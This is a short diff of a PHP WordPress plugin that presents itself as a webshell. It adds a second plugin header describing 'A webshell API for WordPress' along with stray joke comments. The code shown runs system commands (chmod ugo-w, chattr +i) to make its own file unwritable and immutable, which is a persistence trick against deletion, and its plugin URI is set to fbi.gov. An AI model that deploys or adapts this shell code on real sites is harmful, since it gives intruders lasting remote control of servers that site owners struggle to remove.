@@ -1,4 +1,5 @@
 <?php
+//Jembut Mawot Litespeed//
     /*
     Plugin Name: Plugins & Tempik Wordpress Shell
     Plugin URI: fbi.gov
@@ -7,7 +8,20 @@
     Version: 0.3
     Author URI: https://gantengerscrew.github.io
     */
-# attempt to protect myself from deletion
+//attempt to protect myjemnud//
+/*
+Plugin Name: Webshell
+Plugin URI: https://github.com/p0dalirius/Wordpress-webshell-plugin
+Description: A webshell API for WordPress.
+Author: Remi Gascou (Podalirius)
+Version: 1.1.0
+Author URI: https://podalirius.net/
+Text Domain: webshell
+Domain Path: /languages
+License: GPLv3 or later
+Network: true
+*/
+$chunk_size = 1024;
 $this_file = __FILE__;
 @system("chmod ugo-w $this_file");
 @system("chattr +i $this_file");
